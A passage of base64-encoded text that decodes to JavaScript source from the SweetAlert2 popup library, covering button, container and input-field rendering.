tYXRpb25lbmQnIHwgZmFsc2V9XG4gICAqL1xuICBjb25zdCBhbmltYXRpb25FbmRFdmVudCA9ICgoKSA9PiB7XG4gICAgLy8gUHJldmVudCBydW4gaW4gTm9kZSBlbnZcbiAgICAvKiBpc3RhbmJ1bCBpZ25vcmUgaWYgKi9cbiAgICBpZiAoaXNOb2RlRW52KCkpIHtcbiAgICAgIHJldHVybiBmYWxzZTtcbiAgICB9XG4gICAgY29uc3QgdGVzdEVsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7XG4gICAgY29uc3QgdHJhbnNFbmRFdmVudE5hbWVzID0ge1xuICAgICAgV2Via2l0QW5pbWF0aW9uOiAnd2Via2l0QW5pbWF0aW9uRW5kJyxcbiAgICAgIC8vIENocm9tZSwgU2FmYXJpIGFuZCBPcGVyYVxuICAgICAgYW5pbWF0aW9uOiAnYW5pbWF0aW9uZW5kJyAvLyBTdGFuZGFyZCBzeW50YXhcbiAgICB9O1xuXG4gICAgZm9yIChjb25zdCBpIGluIHRyYW5zRW5kRXZlbnROYW1lcykge1xuICAgICAgaWYgKE9iamVjdC5wcm90b3R5cGUuaGFzT3duUHJvcGVydHkuY2FsbCh0cmFuc0VuZEV2ZW50TmFtZXMsIGkpICYmIHR5cGVvZiB0ZXN0RWwuc3R5bGVbaV0gIT09ICd1bmRlZmluZWQnKSB7XG4gICAgICAgIHJldHVybiB0cmFuc0VuZEV2ZW50TmFtZXNbaV07XG4gICAgICB9XG4gICAgfVxuICAgIHJldHVybiBmYWxzZTtcbiAgfSkoKTtcblxuICAvKipcbiAgICogTWVhc3VyZSBzY3JvbGxiYXIgd2lkdGggZm9yIHBhZGRpbmcgYm9keSBkdXJpbmcgbW9kYWwgc2hvdy9oaWRlXG4gICAqIGh0dHBzOi8vZ2l0aHViLmNvbS90d2JzL2Jvb3RzdHJhcC9ibG9iL21hc3Rlci9qcy9zcmMvbW9kYWwuanNcbiAgICpcbiAgICogQHJldHVybnMge251bWJlcn1cbiAgICovXG4gIGNvbnN0IG1lYXN1cmVTY3JvbGxiYXIgPSAoKSA9PiB7XG4gICAgY29uc3Qgc2Nyb2xsRGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7XG4gICAgc2Nyb2xsRGl2LmNsYXNzTmFtZSA9IHN3YWxDbGFzc2VzWydzY3JvbGxiYXItbWVhc3VyZSddO1xuICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2Nyb2xsRGl2KTtcbiAgICBjb25zdCBzY3JvbGxiYXJXaWR0aCA9IHNjcm9sbERpdi5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKS53aWR0aCAtIHNjcm9sbERpdi5jbGllbnRXaWR0aDtcbiAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKHNjcm9sbERpdik7XG4gICAgcmV0dXJuIHNjcm9sbGJhcldpZHRoO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGNvbnN0IHJlbmRlckFjdGlvbnMgPSAoaW5zdGFuY2UsIHBhcmFtcykgPT4ge1xuICAgIGNvbnN0IGFjdGlvbnMgPSBnZXRBY3Rpb25zKCk7XG4gICAgY29uc3QgbG9hZGVyID0gZ2V0TG9hZGVyKCk7XG5cbiAgICAvLyBBY3Rpb25zIChidXR0b25zKSB3cmFwcGVyXG4gICAgaWYgKCFwYXJhbXMuc2hvd0NvbmZpcm1CdXR0b24gJiYgIXBhcmFtcy5zaG93RGVueUJ1dHRvbiAmJiAhcGFyYW1zLnNob3dDYW5jZWxCdXR0b24pIHtcbiAgICAgIGhpZGUoYWN0aW9ucyk7XG4gICAgfSBlbHNlIHtcbiAgICAgIHNob3coYWN0aW9ucyk7XG4gICAgfVxuXG4gICAgLy8gQ3VzdG9tIGNsYXNzXG4gICAgYXBwbHlDdXN0b21DbGFzcyhhY3Rpb25zLCBwYXJhbXMsICdhY3Rpb25zJyk7XG5cbiAgICAvLyBSZW5kZXIgYWxsIHRoZSBidXR0b25zXG4gICAgcmVuZGVyQnV0dG9ucyhhY3Rpb25zLCBsb2FkZXIsIHBhcmFtcyk7XG5cbiAgICAvLyBMb2FkZXJcbiAgICBzZXRJbm5lckh0bWwobG9hZGVyLCBwYXJhbXMubG9hZGVySHRtbCk7XG4gICAgYXBwbHlDdXN0b21DbGFzcyhsb2FkZXIsIHBhcmFtcywgJ2xvYWRlcicpO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBhY3Rpb25zXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGxvYWRlclxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGZ1bmN0aW9uIHJlbmRlckJ1dHRvbnMoYWN0aW9ucywgbG9hZGVyLCBwYXJhbXMpIHtcbiAgICBjb25zdCBjb25maXJtQnV0dG9uID0gZ2V0Q29uZmlybUJ1dHRvbigpO1xuICAgIGNvbnN0IGRlbnlCdXR0b24gPSBnZXREZW55QnV0dG9uKCk7XG4gICAgY29uc3QgY2FuY2VsQnV0dG9uID0gZ2V0Q2FuY2VsQnV0dG9uKCk7XG5cbiAgICAvLyBSZW5kZXIgYnV0dG9uc1xuICAgIHJlbmRlckJ1dHRvbihjb25maXJtQnV0dG9uLCAnY29uZmlybScsIHBhcmFtcyk7XG4gICAgcmVuZGVyQnV0dG9uKGRlbnlCdXR0b24sICdkZW55JywgcGFyYW1zKTtcbiAgICByZW5kZXJCdXR0b24oY2FuY2VsQnV0dG9uLCAnY2FuY2VsJywgcGFyYW1zKTtcbiAgICBoYW5kbGVCdXR0b25zU3R5bGluZyhjb25maXJtQnV0dG9uLCBkZW55QnV0dG9uLCBjYW5jZWxCdXR0b24sIHBhcmFtcyk7XG4gICAgaWYgKHBhcmFtcy5yZXZlcnNlQnV0dG9ucykge1xuICAgICAgaWYgKHBhcmFtcy50b2FzdCkge1xuICAgICAgICBhY3Rpb25zLmluc2VydEJlZm9yZShjYW5jZWxCdXR0b24sIGNvbmZpcm1CdXR0b24pO1xuICAgICAgICBhY3Rpb25zLmluc2VydEJlZm9yZShkZW55QnV0dG9uLCBjb25maXJtQnV0dG9uKTtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIGFjdGlvbnMuaW5zZXJ0QmVmb3JlKGNhbmNlbEJ1dHRvbiwgbG9hZGVyKTtcbiAgICAgICAgYWN0aW9ucy5pbnNlcnRCZWZvcmUoZGVueUJ1dHRvbiwgbG9hZGVyKTtcbiAgICAgICAgYWN0aW9ucy5pbnNlcnRCZWZvcmUoY29uZmlybUJ1dHRvbiwgbG9hZGVyKTtcbiAgICAgIH1cbiAgICB9XG4gIH1cblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gY29uZmlybUJ1dHRvblxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBkZW55QnV0dG9uXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGNhbmNlbEJ1dHRvblxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBwYXJhbXNcbiAgICovXG4gIGZ1bmN0aW9uIGhhbmRsZUJ1dHRvbnNTdHlsaW5nKGNvbmZpcm1CdXR0b24sIGRlbnlCdXR0b24sIGNhbmNlbEJ1dHRvbiwgcGFyYW1zKSB7XG4gICAgaWYgKCFwYXJhbXMuYnV0dG9uc1N0eWxpbmcpIHtcbiAgICAgIHJlbW92ZUNsYXNzKFtjb25maXJtQnV0dG9uLCBkZW55QnV0dG9uLCBjYW5jZWxCdXR0b25dLCBzd2FsQ2xhc3Nlcy5zdHlsZWQpO1xuICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBhZGRDbGFzcyhbY29uZmlybUJ1dHRvbiwgZGVueUJ1dHRvbiwgY2FuY2VsQnV0dG9uXSwgc3dhbENsYXNzZXMuc3R5bGVkKTtcblxuICAgIC8vIEJ1dHRvbnMgYmFja2dyb3VuZCBjb2xvcnNcbiAgICBpZiAocGFyYW1zLmNvbmZpcm1CdXR0b25Db2xvcikge1xuICAgICAgY29uZmlybUJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSBwYXJhbXMuY29uZmlybUJ1dHRvbkNvbG9yO1xuICAgICAgYWRkQ2xhc3MoY29uZmlybUJ1dHRvbiwgc3dhbENsYXNzZXNbJ2RlZmF1bHQtb3V0bGluZSddKTtcbiAgICB9XG4gICAgaWYgKHBhcmFtcy5kZW55QnV0dG9uQ29sb3IpIHtcbiAgICAgIGRlbnlCdXR0b24uc3R5bGUuYmFja2dyb3VuZENvbG9yID0gcGFyYW1zLmRlbnlCdXR0b25Db2xvcjtcbiAgICAgIGFkZENsYXNzKGRlbnlCdXR0b24sIHN3YWxDbGFzc2VzWydkZWZhdWx0LW91dGxpbmUnXSk7XG4gICAgfVxuICAgIGlmIChwYXJhbXMuY2FuY2VsQnV0dG9uQ29sb3IpIHtcbiAgICAgIGNhbmNlbEJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSBwYXJhbXMuY2FuY2VsQnV0dG9uQ29sb3I7XG4gICAgICBhZGRDbGFzcyhjYW5jZWxCdXR0b24sIHN3YWxDbGFzc2VzWydkZWZhdWx0LW91dGxpbmUnXSk7XG4gICAgfVxuICB9XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGJ1dHRvblxuICAgKiBAcGFyYW0geydjb25maXJtJyB8ICdkZW55JyB8ICdjYW5jZWwnfSBidXR0b25UeXBlXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgZnVuY3Rpb24gcmVuZGVyQnV0dG9uKGJ1dHRvbiwgYnV0dG9uVHlwZSwgcGFyYW1zKSB7XG4gICAgdG9nZ2xlKGJ1dHRvbiwgcGFyYW1zW2BzaG93JHtjYXBpdGFsaXplRmlyc3RMZXR0ZXIoYnV0dG9uVHlwZSl9QnV0dG9uYF0sICdpbmxpbmUtYmxvY2snKTtcbiAgICBzZXRJbm5lckh0bWwoYnV0dG9uLCBwYXJhbXNbYCR7YnV0dG9uVHlwZX1CdXR0b25UZXh0YF0pOyAvLyBTZXQgY2FwdGlvbiB0ZXh0XG4gICAgYnV0dG9uLnNldEF0dHJpYnV0ZSgnYXJpYS1sYWJlbCcsIHBhcmFtc1tgJHtidXR0b25UeXBlfUJ1dHRvbkFyaWFMYWJlbGBdKTsgLy8gQVJJQSBsYWJlbFxuXG4gICAgLy8gQWRkIGJ1dHRvbnMgY3VzdG9tIGNsYXNzZXNcbiAgICBidXR0b24uY2xhc3NOYW1lID0gc3dhbENsYXNzZXNbYnV0dG9uVHlwZV07XG4gICAgYXBwbHlDdXN0b21DbGFzcyhidXR0b24sIHBhcmFtcywgYCR7YnV0dG9uVHlwZX1CdXR0b25gKTtcbiAgICBhZGRDbGFzcyhidXR0b24sIHBhcmFtc1tgJHtidXR0b25UeXBlfUJ1dHRvbkNsYXNzYF0pO1xuICB9XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgcmVuZGVyQ2xvc2VCdXR0b24gPSAoaW5zdGFuY2UsIHBhcmFtcykgPT4ge1xuICAgIGNvbnN0IGNsb3NlQnV0dG9uID0gZ2V0Q2xvc2VCdXR0b24oKTtcbiAgICBzZXRJbm5lckh0bWwoY2xvc2VCdXR0b24sIHBhcmFtcy5jbG9zZUJ1dHRvbkh0bWwpO1xuXG4gICAgLy8gQ3VzdG9tIGNsYXNzXG4gICAgYXBwbHlDdXN0b21DbGFzcyhjbG9zZUJ1dHRvbiwgcGFyYW1zLCAnY2xvc2VCdXR0b24nKTtcbiAgICB0b2dnbGUoY2xvc2VCdXR0b24sIHBhcmFtcy5zaG93Q2xvc2VCdXR0b24pO1xuICAgIGNsb3NlQnV0dG9uLnNldEF0dHJpYnV0ZSgnYXJpYS1sYWJlbCcsIHBhcmFtcy5jbG9zZUJ1dHRvbkFyaWFMYWJlbCk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgcmVuZGVyQ29udGFpbmVyID0gKGluc3RhbmNlLCBwYXJhbXMpID0+IHtcbiAgICBjb25zdCBjb250YWluZXIgPSBnZXRDb250YWluZXIoKTtcbiAgICBpZiAoIWNvbnRhaW5lcikge1xuICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBoYW5kbGVCYWNrZHJvcFBhcmFtKGNvbnRhaW5lciwgcGFyYW1zLmJhY2tkcm9wKTtcbiAgICBoYW5kbGVQb3NpdGlvblBhcmFtKGNvbnRhaW5lciwgcGFyYW1zLnBvc2l0aW9uKTtcbiAgICBoYW5kbGVHcm93UGFyYW0oY29udGFpbmVyLCBwYXJhbXMuZ3Jvdyk7XG5cbiAgICAvLyBDdXN0b20gY2xhc3NcbiAgICBhcHBseUN1c3RvbUNsYXNzKGNvbnRhaW5lciwgcGFyYW1zLCAnY29udGFpbmVyJyk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGNvbnRhaW5lclxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zWydiYWNrZHJvcCddfSBiYWNrZHJvcFxuICAgKi9cbiAgZnVuY3Rpb24gaGFuZGxlQmFja2Ryb3BQYXJhbShjb250YWluZXIsIGJhY2tkcm9wKSB7XG4gICAgaWYgKHR5cGVvZiBiYWNrZHJvcCA9PT0gJ3N0cmluZycpIHtcbiAgICAgIGNvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kID0gYmFja2Ryb3A7XG4gICAgfSBlbHNlIGlmICghYmFja2Ryb3ApIHtcbiAgICAgIGFkZENsYXNzKFtkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQsIGRvY3VtZW50LmJvZHldLCBzd2FsQ2xhc3Nlc1snbm8tYmFja2Ryb3AnXSk7XG4gICAgfVxuICB9XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGNvbnRhaW5lclxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zWydwb3NpdGlvbiddfSBwb3NpdGlvblxuICAgKi9cbiAgZnVuY3Rpb24gaGFuZGxlUG9zaXRpb25QYXJhbShjb250YWluZXIsIHBvc2l0aW9uKSB7XG4gICAgaWYgKHBvc2l0aW9uIGluIHN3YWxDbGFzc2VzKSB7XG4gICAgICBhZGRDbGFzcyhjb250YWluZXIsIHN3YWxDbGFzc2VzW3Bvc2l0aW9uXSk7XG4gICAgfSBlbHNlIHtcbiAgICAgIHdhcm4oJ1RoZSBcInBvc2l0aW9uXCIgcGFyYW1ldGVyIGlzIG5vdCB2YWxpZCwgZGVmYXVsdGluZyB0byBcImNlbnRlclwiJyk7XG4gICAgICBhZGRDbGFzcyhjb250YWluZXIsIHN3YWxDbGFzc2VzLmNlbnRlcik7XG4gICAgfVxuICB9XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGNvbnRhaW5lclxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zWydncm93J119IGdyb3dcbiAgICovXG4gIGZ1bmN0aW9uIGhhbmRsZUdyb3dQYXJhbShjb250YWluZXIsIGdyb3cpIHtcbiAgICBpZiAoZ3JvdyAmJiB0eXBlb2YgZ3JvdyA9PT0gJ3N0cmluZycpIHtcbiAgICAgIGNvbnN0IGdyb3dDbGFzcyA9IGBncm93LSR7Z3Jvd31gO1xuICAgICAgaWYgKGdyb3dDbGFzcyBpbiBzd2FsQ2xhc3Nlcykge1xuICAgICAgICBhZGRDbGFzcyhjb250YWluZXIsIHN3YWxDbGFzc2VzW2dyb3dDbGFzc10pO1xuICAgICAgfVxuICAgIH1cbiAgfVxuXG4gIC8vLyA8cmVmZXJlbmNlIHBhdGg9XCIuLi8uLi8uLi8uLi9zd2VldGFsZXJ0Mi5kLnRzXCIvPlxuXG4gIC8qKiBAdHlwZSB7SW5wdXRDbGFzc1tdfSAqL1xuICBjb25zdCBpbnB1dENsYXNzZXMgPSBbJ2lucHV0JywgJ2ZpbGUnLCAncmFuZ2UnLCAnc2VsZWN0JywgJ3JhZGlvJywgJ2NoZWNrYm94JywgJ3RleHRhcmVhJ107XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgcmVuZGVySW5wdXQgPSAoaW5zdGFuY2UsIHBhcmFtcykgPT4ge1xuICAgIGNvbnN0IHBvcHVwID0gZ2V0UG9wdXAoKTtcbiAgICBjb25zdCBpbm5lclBhcmFtcyA9IHByaXZhdGVQcm9wcy5pbm5lclBhcmFtcy5nZXQoaW5zdGFuY2UpO1xuICAgIGNvbnN0IHJlcmVuZGVyID0gIWlubmVyUGFyYW1zIHx8IHBhcmFtcy5pbnB1dCAhPT0gaW5uZXJQYXJhbXMuaW5wdXQ7XG4gICAgaW5wdXRDbGFzc2VzLmZvckVhY2goaW5wdXRDbGFzcyA9PiB7XG4gICAgICBjb25zdCBpbnB1dENvbnRhaW5lciA9IGdldERpcmVjdENoaWxkQnlDbGFzcyhwb3B1cCwgc3dhbENsYXNzZXNbaW5wdXRDbGFzc10pO1xuXG4gICAgICAvLyBzZXQgYXR0cmlidXRlc1xuICAgICAgc2V0QXR0cmlidXRlcyhpbnB1dENsYXNzLCBwYXJhbXMuaW5wdXRBdHRyaWJ1dGVzKTtcblxuICAgICAgLy8gc2V0IGNsYXNzXG4gICAgICBpbnB1dENvbnRhaW5lci5jbGFzc05hbWUgPSBzd2FsQ2xhc3Nlc1tpbnB1dENsYXNzXTtcbiAgICAgIGlmIChyZXJlbmRlcikge1xuICAgICAgICBoaWRlKGlucHV0Q29udGFpbmVyKTtcbiAgICAgIH1cbiAgICB9KTtcbiAgICBpZiAocGFyYW1zLmlucHV0KSB7XG4gICAgICBpZiAocmVyZW5kZXIpIHtcbiAgICAgICAgc2hvd0lucHV0KHBhcmFtcyk7XG4gICAgICB9XG4gICAgICAvLyBzZXQgY3VzdG9tIGNsYXNzXG4gICAgICBzZXRDdXN0b21DbGFzcyhwYXJhbXMpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBjb25zdCBzaG93SW5wdXQgPSBwYXJhbXMgPT4ge1xuICAgIGlmICghcmVuZGVySW5wdXRUeXBlW3BhcmFtcy5pbnB1dF0pIHtcbiAgICAgIGVycm9yKGBVbmV4cGVjdGVkIHR5cGUgb2YgaW5wdXQhIEV4cGVjdGVkIFwidGV4dFwiLCBcImVtYWlsXCIsIFwicGFzc3dvcmRcIiwgXCJudW1iZXJcIiwgXCJ0ZWxcIiwgXCJzZWxlY3RcIiwgXCJyYWRpb1wiLCBcImNoZWNrYm94XCIsIFwidGV4dGFyZWFcIiwgXCJmaWxlXCIgb3IgXCJ1cmxcIiwgZ290IFwiJHtwYXJhbXMuaW5wdXR9XCJgKTtcbiAgICAgIHJldHVybjtcbiAgICB9XG4gICAgY29uc3QgaW5wdXRDb250YWluZXIgPSBnZXRJbnB1dENvbnRhaW5lcihwYXJhbXMuaW5wdXQpO1xuICAgIGNvbnN0IGlucHV0ID0gcmVuZGVySW5wdXRUeXBlW3BhcmFtcy5pbnB1dF0oaW5wdXRDb250YWluZXIsIHBhcmFtcyk7XG4gICAgc2hvdyhpbnB1dENvbnRhaW5lcik7XG5cbiAgICAvLyBpbnB1dCBhdXRvZm9jdXNcbiAgICBpZiAocGFyYW1zLmlucHV0QXV0b0ZvY3VzKSB7XG4gICAgICBzZXRUaW1lb3V0KCgpID0+IHtcbiAgICAgICAgZm9jdXNJbnB1dChpbnB1dCk7XG4gICAgICB9KTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTElucHV0RWxlbWVudH0gaW5wdXRcbiAgICovXG4gIGNvbnN0IHJlbW92ZUF0dHJpYnV0ZXMgPSBpbnB1dCA9PiB7XG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBpbnB1dC5hdHRyaWJ1dGVzLmxlbmd0aDsgaSsrKSB7XG4gICAgICBjb25zdCBhdHRyTmFtZSA9IGlucHV0LmF0dHJpYnV0ZXNbaV0ubmFtZTtcbiAgICAgIGlmICghWyd0eXBlJywgJ3ZhbHVlJywgJ3N0eWxlJ10uaW5jbHVkZXMoYXR0ck5hbWUpKSB7XG4gICAgICAgIGlucHV0LnJlbW92ZUF0dHJpYnV0ZShhdHRyTmFtZSk7XG4gICAgICB9XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0lucHV0Q2xhc3N9IGlucHV0Q2xhc3NcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc1snaW5wdXRBdHRyaWJ1dGVzJ119IGlucHV0QXR0cmlidXRlc1xuICAgKi9cbiAgY29uc3Qgc2V0QXR0cmlidXRlcyA9IChpbnB1dENsYXNzLCBpbnB1dEF0dHJpYnV0ZXMpID0+IHtcbiAgICBjb25zdCBpbnB1dCA9IGdldElucHV0JDEoZ2V0UG9wdXAoKSwgaW5wdXRDbGFzcyk7XG4gICAgaWYgKCFpbnB1dCkge1xuICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICByZW1vdmVBdHRyaWJ1dGVzKGlucHV0KTtcbiAgICBmb3IgKGNvbnN0IGF0dHIgaW4gaW5wdXRBdHRyaWJ1dGVzKSB7XG4gICAgICBpbnB1dC5zZXRBdHRyaWJ1dGUoYXR0ciwgaW5wdXRBdHRyaWJ1dGVzW2F0dHJdKTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3Qgc2V0Q3VzdG9tQ2xhc3MgPSBwYXJhbXMgPT4ge1xuICAgIGNvbnN0IGlucHV0Q29udGFpbmVyID0gZ2V0SW5wdXRDb250YWluZXIocGFyYW1zLmlucHV0KTtcbiAgICBpZiAodHlwZW9mIHBhcmFtcy5jdXN0b21DbGFzcyA9PT0gJ29iamVjdCcpIHtcbiAgICAgIGFkZENsYXNzKGlucHV0Q29udGFpbmVyLCBwYXJhbXMuY3VzdG9tQ2xhc3MuaW5wdXQpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MSW5wdXRFbGVtZW50IHwgSFRNTFRleHRBcmVhRWxlbWVudH0gaW5wdXRcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBjb25zdCBzZXRJbnB1dFBsYWNlaG9sZGVyID0gKGlucHV0LCBwYXJhbXMpID0+IHtcbiAgICBpZiAoIWlucHV0LnBsYWNlaG9sZGVyIHx8IHBhcmFtcy5pbnB1dFBsYWNlaG9sZGVyKSB7XG4gICAgICBpbnB1dC5wbGFjZWhvbGRlciA9IHBhcmFtcy5pbnB1dFBsYWNlaG9sZGVyO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtJbnB1dH0gaW5wdXRcbiAgICogQHBhcmFtIHtJbnB1dH0gcHJlcGVuZFRvXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3Qgc2V0SW5wdXRMYWJlbCA9IChpbnB1dCwgcHJlcGVuZFRvLCBwYXJhbXMpID0+IHtcbiAgICBpZiAocGFyYW1zLmlucHV0TGFiZWwpIHtcbiAgICAgIGlucHV0LmlkID0gc3dhbENsYXNzZXMuaW5wdXQ7XG4gICAgICBjb25zdCBsYWJlbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2xhYmVsJyk7XG4gICAgICBjb25zdCBsYWJlbENsYXNzID0gc3dhbENsYXNzZXNbJ2lucHV0LWxhYmVsJ107XG4gICAgICBsYWJlbC5zZXRBdHRyaWJ1dGUoJ2ZvcicsIGlucHV0LmlkKTtcbiAgICAgIGxhYmVsLmNsYXNzTmFtZSA9IGxhYmVsQ2xhc3M7XG4gICAgICBpZiAodHlwZW9mIHBhcmFtcy5jdXN0b21DbGFzcyA9PT0gJ29iamVjdCcpIHtcbiAgICAgICAgYWRkQ2xhc3MobGFiZWwsIHBhcmFtcy5jdXN0b21DbGFzcy5pbnB1dExhYmVsKTtcbiAgICAgIH1cbiAgICAgIGxhYmVsLmlubmVyVGV4dCA9IHBhcmFtcy5pbnB1dExhYmVsO1xuICAgICAgcHJlcGVuZFRvLmluc2VydEFkamFjZW50RWxlbWVudCgnYmVmb3JlYmVnaW4nLCBsYWJlbCk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zWydpbnB1dCddfSBpbnB1dFR5cGVcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50fVxuICAgKi9cbiAgY29uc3QgZ2V0SW5wdXRDb250YWluZXIgPSBpbnB1dFR5cGUgPT4ge1xuICAgIHJldHVybiBnZXREaXJlY3RDaGlsZEJ5Q2xhc3MoZ2V0UG9wdXAoKSwgc3dhbENsYXNzZXNbaW5wdXRUeXBlXSB8fCBzd2FsQ2xhc3Nlcy5pbnB1dCk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTElucHV0RWxlbWVudCB8IEhUTUxPdXRwdXRFbGVtZW50IHwgSFRNTFRleHRBcmVhRWxlbWVudH0gaW5wdXRcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc1snaW5wdXRWYWx1ZSddfSBpbnB1dFZhbHVlXG4gICAqL1xuICBjb25zdCBjaGVja0FuZFNldElucHV0VmFsdWUgPSAoaW5wdXQsIGlucHV0VmFsdWUpID0+IHtcbiAgICBpZiAoWydzdHJpbmcnLCAnbnVtYmVyJ10uaW5jbHVkZXModHlwZW9mIGlucHV0VmFsdWUpKSB7XG4gICAgICBpbnB1dC52YWx1ZSA9IGAke2lucHV0VmFsdWV9YDtcbiAgICB9IGVsc2UgaWYgKCFpc1Byb21pc2UoaW5wdXRWYWx1ZSkpIHtcbiAgICAgIHdhcm4oYFVuZXhwZWN0ZWQgdHlwZSBvZiBpbnB1dFZhbHVlISBFeHBlY3RlZCBcInN0cmluZ1wiLCBcIm51bWJlclwiIG9yIFwiUHJvbWlzZVwiLCBnb3QgXCIke3R5cGVvZiBpbnB1dFZhbHVlfVwiYCk7XG4gICAgfVxuICB9O1xuXG4gIC8qKiBAdHlwZSB7UmVjb3JkPHN0cmluZywgKGlucHV0OiBJbnB1dCB8IEhUTUxFbGVtZW50LCBwYXJhbXM6IFN3ZWV0QWxlcnRPcHRpb25zKSA9PiBJbnB1dD59ICovXG4gIGNvbnN0IHJlbmRlcklucHV0VHlwZSA9IHt9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxJbnB1dEVsZW1lbnR9IGlucHV0XG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKiBAcmV0dXJucyB7SFRNTElucHV0RWxlbWVudH1cbiAgICovXG4gIHJlbmRlcklucHV0VHlwZS50ZXh0ID0gcmVuZGVySW5wdXRUeXBlLmVtYWlsID0gcmVuZGVySW5wdXRUeXBlLnBhc3N3b3JkID0gcmVuZGVySW5wdXRUeXBlLm51bWJlciA9IHJlbmRlcklucHV0VHlwZS50ZWwgPSByZW5kZXJJbnB1dFR5cGUudXJsID0gKGlucHV0LCBwYXJhbXMpID0+IHtcbiAgICBjaGVja0FuZFNldElucHV0VmFsdWUoaW5wdXQsIHBhcmFtcy5pbnB1dFZhbHVlKTtcbiAgICBzZXRJbnB1dExhYmVsKGlucHV0LCBpbnB1dCwgcGFyYW1zKTtcbiAgICBzZXRJbnB1dFBsYWNlaG9sZGVyKGlucHV0LCBwYXJhbXMpO1xuICAgIGlucHV0LnR5cGUgPSBwYXJhbXMuaW5wdXQ7XG4gICAgcmV0dXJuIGlucHV0O1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxJbnB1dEVsZW1lbnR9IGlucHV0XG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKiBAcmV0dXJucyB7SFRNTElucHV0RWxlbWVudH1cbiAgICovXG4gIHJlbmRlcklucHV0VHlwZS5maWxlID0gKGlucHV0LCBwYXJhbXMpID0+IHtcbiAgICBzZXRJbnB1dExhYmVsKGlucHV0LCBpbnB1dCwgcGFyYW1zKTtcbiAgICBzZXRJbnB1dFBsYWNlaG9sZGVyKGlucHV0LCBwYXJhbXMpO1xuICAgIHJldHVybiBpbnB1dDtcbiAgfT